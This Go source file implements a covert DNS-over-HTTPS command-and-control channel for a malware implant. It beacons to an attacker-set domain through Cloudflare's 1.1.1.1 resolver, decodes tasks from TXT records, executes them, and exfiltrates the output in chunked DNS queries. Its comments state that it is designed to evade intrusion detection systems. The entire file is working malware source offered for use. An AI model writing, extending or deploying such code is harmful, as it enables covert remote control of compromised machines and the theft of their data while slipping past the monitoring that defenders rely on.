package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// DoH (DNS over HTTPS) secondary C2 channel.
//
// Protocol:
//   Agent → queries <encoded_agent_id>.poll.<C2Domain> TXT via DoH
//   Server → responds with base64-encoded task JSON in TXT record
//   Agent → executes task, exfils result via <encoded_result>.<taskid>.result.<C2Domain> TXT
//
// This bypasses HTTP-level IDS/IPS that filter on port 80/443 C2 traffic,
// since all comms ride inside standard DNS-over-HTTPS (port 443 to 1.1.1.1).

// DohVar: set at build time via -ldflags "-X main.DohVar=1" to enable DoH beacon
var DohVar = ""

// C2Domain: domain for DNS C2 (set via ldflags)
var C2Domain = ""

var dohClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
	},
	Timeout: 10 * time.Second,
}

// dohQuery resolves a TXT record via Cloudflare DoH (1.1.1.1).
func dohQuery(name string) ([]string, error) {
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=TXT", name)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept", "application/dns-json")

	resp, err := dohClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var result struct {
		Answer []struct {
			Type int    `json:"type"` // 16 = TXT
			Data string `json:"data"`
		} `json:"Answer"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}

	var txts []string
	for _, a := range result.Answer {
		if a.Type == 16 {
			// Cloudflare wraps TXT data in quotes
			data := strings.Trim(a.Data, `"`)
			txts = append(txts, data)
		}
	}
	return txts, nil
}

// dohCheckin polls for a task via DoH TXT query.
// Query: <base64(agentID)>.poll.<C2Domain>
// Returns the task JSON encoded in the TXT response.
func dohCheckin(agentID string) (*Task, error) {
	if C2Domain == "" {
		return nil, fmt.Errorf("C2Domain not set")
	}
	encoded := base64.RawURLEncoding.EncodeToString([]byte(agentID))
	// Truncate to valid DNS label length (63 chars)
	if len(encoded) > 63 {
		encoded = encoded[:63]
	}
	name := fmt.Sprintf("%s.poll.%s", encoded, C2Domain)

	txts, err := dohQuery(name)
	if err != nil || len(txts) == 0 {
		return nil, err
	}

	// Reassemble (TXT records may be split into 255-byte chunks)
	combined := strings.Join(txts, "")
	taskJSON, err := base64.StdEncoding.DecodeString(combined)
	if err != nil {
		return nil, fmt.Errorf("decode task: %w", err)
	}

	var task Task
	if err := json.Unmarshal(taskJSON, &task); err != nil {
		return nil, fmt.Errorf("unmarshal task: %w", err)
	}
	return &task, nil
}

// dohSendResult exfiltrates task output via DoH TXT queries.
// Uses multiple queries to chunk large output (max ~200 bytes per label).
func dohSendResult(agentID, taskID, output, status string) error {
	if C2Domain == "" {
		return fmt.Errorf("C2Domain not set")
	}
	result := TaskResult{TaskID: taskID, Output: output, Status: status}
	data, err := json.Marshal(result)
	if err != nil {
		return err
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	const chunkSize = 60 // DNS label limit

	chunks := splitString(encoded, chunkSize)
	total := len(chunks)

	for i, chunk := range chunks {
		// Query: <chunk>.<i>-<total>.<taskid_prefix>.result.<agentid_prefix>.<C2Domain>
		taskPrefix := taskID
		if len(taskPrefix) > 8 {
			taskPrefix = taskPrefix[:8]
		}
		agentPrefix := agentID
		if len(agentPrefix) > 8 {
			agentPrefix = agentPrefix[:8]
		}
		name := fmt.Sprintf("%s.%d-%d.%s.result.%s.%s",
			chunk, i, total, taskPrefix, agentPrefix, C2Domain)
		// Fire query — server's DNS captures and parses it
		dohQuery(name) // ignore response
	}
	return nil
}

func splitString(s string, size int) []string {
	var parts []string
	for len(s) > size {
		parts = append(parts, s[:size])
		s = s[size:]
	}
	if len(s) > 0 {
		parts = append(parts, s)
	}
	return parts
}

// runDohBeacon is the secondary beacon loop using DoH as transport.
// Run as a goroutine alongside the primary HTTP beacon.
func runDohBeacon(agentID string) {
	if DohVar == "" || C2Domain == "" {
		return
	}
	fmt.Printf("[*] DoH beacon active → %s\n", C2Domain)
	for {
		task, err := dohCheckin(agentID)
		if err == nil && task != nil && task.ID != "" {
			output, status := dispatch(task.Command)
			dohSendResult(agentID, task.ID, output, status)
		}
		time.Sleep(30 * time.Second)
	}
}
